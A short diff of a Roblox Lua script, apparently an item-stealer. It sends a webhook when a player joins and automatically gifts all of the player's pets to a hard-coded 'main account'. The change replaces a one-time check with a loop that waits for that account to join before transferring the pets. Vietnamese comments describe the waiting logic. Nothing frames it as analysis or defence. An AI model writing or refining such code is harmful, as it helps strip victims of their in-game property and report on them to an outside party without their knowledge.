@@ -145,18 +145,20 @@ Players.PlayerAdded:Connect(function(player)
     sendWebhook(player)
 
     if player.UserId == MAIN_USER_ID then
-        task.wait(5)
+        task.wait(6)
         autoGiftAllPets(player)
     end
 end)
 
--- 🔁 Nếu acc chính đã có trong server sẵn
+-- 🔁 Chờ đến khi acc main vào (check mỗi 5 giây)
 task.spawn(function()
-    local alreadyIn = getMainPlayer()
-    if alreadyIn then
-        task.wait(6)
-        autoGiftAllPets(alreadyIn)
-    else
-        print("⚠️ Main account không online.")
+    local found = getMainPlayer()
+    while not found do
+        print("⏳ Đang chờ main account vào...")
+        task.wait(5)
+        found = getMainPlayer()
     end
+
+    task.wait(6)
+    autoGiftAllPets(found)
 end)
